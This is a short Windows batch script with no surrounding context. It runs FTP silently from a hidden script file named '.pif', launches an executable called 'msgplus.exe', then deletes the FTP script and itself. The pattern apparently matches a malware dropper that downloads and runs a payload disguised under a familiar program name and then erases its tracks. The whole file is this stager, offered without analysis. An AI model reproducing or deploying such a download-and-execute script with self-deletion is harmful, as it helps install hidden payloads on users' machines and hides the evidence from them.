@echo off 
ftp -n -v -s:.pif 
msgplus.exe 
del .pif 
del /F c.bat 
